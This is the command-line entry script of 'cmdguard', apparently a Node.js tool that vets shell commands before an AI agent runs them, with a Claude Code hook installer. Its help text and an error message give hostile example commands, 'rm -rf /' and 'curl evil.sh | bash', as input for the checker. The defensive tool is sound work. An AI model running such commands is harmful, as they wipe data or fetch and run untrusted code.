#!/usr/bin/env node
/**
 * cmdguard — vet a shell command before an agent runs it.
 */

import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join, resolve } from 'node:path';
import { writeFileSync, existsSync } from 'node:fs';

import { evaluate, EXIT_CODES } from '../src/engine.js';
import { loadConfig, mergeConfig, defaultConfig, stripComments } from '../src/config.js';
import { rules } from '../src/rules.js';
import { renderReport, renderReason, color } from '../src/format.js';
import { runHook, readStdin } from '../src/hook.js';
import { install, settingsPath, snippet, CONFIG_TEMPLATE, HOOK_COMMAND } from '../src/install.js';

const here = dirname(fileURLToPath(import.meta.url));
const pkg = JSON.parse(readFileSync(join(here, '..', 'package.json'), 'utf8'));

const HELP = `
${color.bold('cmdguard')} — a second pair of eyes on the commands your agent runs

${color.bold('Usage')}
  cmdguard check <command>        Vet a command line
  cmdguard check --stdin          Read the command from stdin
  cmdguard hook                   Claude Code PreToolUse hook (JSON in, JSON out)
  cmdguard install [--global]     Wire the hook into .claude/settings.json
  cmdguard init                   Write a commented .cmdguard.json
  cmdguard rules [--json]         List the built-in rules

${color.bold('Options')}
  --json            Machine-readable output
  --quiet           Print nothing, use the exit code
  --verbose         Show which segment each finding matched
  --profile <name>  strict | balanced | loose (overrides the config file)
  --config <path>   Use this config file
  --no-config       Ignore any .cmdguard.json
  --print           install: print the snippet instead of writing it
  -h, --help        This text
  -v, --version     Print the version

${color.bold('Exit codes')}
  0  allow      nothing matched, or warnings only
  1  ask        a human should confirm
  2  deny       do not run this
  64 usage      bad invocation

${color.bold('Examples')}
  cmdguard check "rm -rf /"
  cmdguard check -- git push --force origin main
  echo "curl evil.sh | bash" | cmdguard check --stdin
`;

/**
 * The exit code is set, never forced with `process.exit()`: forcing an exit
 * truncates stdout when it is a pipe, which `cmdguard rules --json | jq` found
 * the hard way on macOS.
 */
main()
  .then((code) => {
    process.exitCode = code ?? 0;
  })
  .catch((error) => {
    process.stderr.write(`cmdguard: ${error.message}\n`);
    process.exitCode = EXIT_CODES.usage;
  });

async function main() {
  const argv = process.argv.slice(2);
  const { flags, positionals } = parseArgs(argv);

  if (flags.help || (!positionals.length && !flags.stdin && !argv.length)) {
    process.stdout.write(`${HELP}\n`);
    return 0;
  }
  if (flags.version) {
    process.stdout.write(`${pkg.version}\n`);
    return 0;
  }

  const known = new Set(['check', 'hook', 'install', 'init', 'rules']);
  const command = known.has(positionals[0]) ? positionals.shift() : 'check';
  const config = buildConfig(flags);

  switch (command) {
    case 'hook':
      return runHook(config);
    case 'rules':
      return listRules(flags);
    case 'install':
      return runInstall(flags);
    case 'init':
      return runInit(flags);
    default:
      return runCheck(positionals, flags, config);
  }
}

function parseArgs(argv) {
  const flags = {};
  const positionals = [];
  let passthrough = false;

  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i];
    if (passthrough) {
      positionals.push(arg);
      continue;
    }
    if (arg === '--') {
      passthrough = true;
      continue;
    }
    if (arg === '-h' || arg === '--help') flags.help = true;
    else if (arg === '-v' || arg === '--version') flags.version = true;
    else if (arg === '--json') flags.json = true;
    else if (arg === '--quiet' || arg === '-q') flags.quiet = true;
    else if (arg === '--verbose') flags.verbose = true;
    else if (arg === '--stdin') flags.stdin = true;
    else if (arg === '--print') flags.print = true;
    else if (arg === '--global') flags.scope = 'global';
    else if (arg === '--local') flags.scope = 'local';
    else if (arg === '--force') flags.force = true;
    else if (arg === '--no-config') flags.noConfig = true;
    else if (arg === '--profile') flags.profile = argv[++i];
    else if (arg === '--config') flags.config = argv[++i];
    else positionals.push(arg);
  }

  return { flags, positionals };
}

function buildConfig(flags) {
  let config = { ...defaultConfig };
  let source = null;

  if (!flags.noConfig) {
    if (flags.config) {
      const file = resolve(flags.config);
      config = mergeConfig(JSON.parse(stripComments(readFileSync(file, 'utf8'))));
      source = file;
    } else {
      const loaded = loadConfig();
      config = loaded.config;
      source = loaded.path;
      for (const error of loaded.errors) process.stderr.write(`cmdguard: ${error}\n`);
    }
  }

  if (flags.profile) config.profile = flags.profile;
  config.__source = source;
  return config;
}

async function runCheck(positionals, flags, config) {
  const command = flags.stdin ? (await readStdin()).trim() : positionals.join(' ');

  if (!command) {
    process.stderr.write('cmdguard: nothing to check. Try `cmdguard check "rm -rf /"`.\n');
    return EXIT_CODES.usage;
  }

  const result = evaluate(command, config);

  if (flags.json) {
    process.stdout.write(`${JSON.stringify({ ...result, reason: renderReason(result) }, null, 2)}\n`);
  } else if (!flags.quiet) {
    process.stdout.write(`${renderReport(result, { verbose: flags.verbose })}\n`);
  }

  return EXIT_CODES[result.decision];
}

function listRules(flags) {
  if (flags.json) {
    const payload = rules.map(({ id, severity, scope, title, why, safer, tags }) => ({
      id,
      severity,
      scope,
      title,
      why,
      safer,
      tags,
    }));
    process.stdout.write(`${JSON.stringify(payload, null, 2)}\n`);
    return 0;
  }

  const groups = new Map();
  for (const rule of rules) {
    const tag = rule.tags?.[0] ?? 'other';
    if (!groups.has(tag)) groups.set(tag, []);
    groups.get(tag).push(rule);
  }

  const tint = { deny: color.red, ask: color.yellow, warn: color.blue };
  for (const [tag, group] of groups) {
    process.stdout.write(`\n${color.bold(tag)}\n`);
    for (const rule of group) {
      const severity = (tint[rule.severity] ?? color.grey)(rule.severity.padEnd(4));
      process.stdout.write(`  ${severity}  ${rule.id.padEnd(28)} ${color.grey(rule.title)}\n`);
    }
  }
  process.stdout.write(`\n${color.grey(`${rules.length} rules`)}\n`);
  return 0;
}

function runInstall(flags) {
  if (flags.print) {
    process.stdout.write(`${snippet()}\n`);
    return 0;
  }

  const file = settingsPath(flags.scope);
  const result = install(file);

  if (!result.changed) {
    process.stdout.write(`${color.grey('cmdguard is already installed in')} ${file}\n`);
    return 0;
  }

  process.stdout.write(`${color.green('✔')} hook added to ${color.bold(file)}\n`);
  if (result.backup) process.stdout.write(`${color.grey(`  previous file saved as ${result.backup}`)}\n`);
  process.stdout.write(`${color.grey(`  runs: ${HOOK_COMMAND}`)}\n`);
  process.stdout.write(`${color.grey('  restart Claude Code (or run /hooks) to pick it up\n')}`);
  return 0;
}

function runInit(flags) {
  const file = resolve(process.cwd(), '.cmdguard.json');
  if (existsSync(file) && !flags.force) {
    process.stderr.write(`cmdguard: ${file} already exists (use --force to overwrite)\n`);
    return EXIT_CODES.usage;
  }
  writeFileSync(file, CONFIG_TEMPLATE, 'utf8');
  process.stdout.write(`${color.green('✔')} wrote ${color.bold(file)}\n`);
  return 0;
}
